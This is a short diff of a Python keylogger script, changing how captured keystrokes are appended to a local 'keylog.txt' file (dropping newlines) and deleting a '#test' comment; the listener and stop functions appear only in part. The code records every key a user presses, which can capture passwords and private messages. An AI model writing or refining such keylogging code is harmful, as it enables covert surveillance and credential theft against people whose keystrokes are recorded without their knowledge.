@@ -6,10 +6,10 @@ listner_running = True
 def on_press(key):
     try:
         with open('keylog.txt', 'a') as file:
-            file.write(f"{key.char}\n")
+            file.write(f"{key.char}")
     except AttributeError:
             with open('keylog.txt', 'a') as file:
-                 file.write(f'{key}\n')
+                 file.write(f'{key}')
 
 def on_release(status):
      global listner_running
@@ -28,5 +28,3 @@ def stop_keylogger():
      global listner_running, listener
      listner_running = False
      listener.stop()
-
-#test
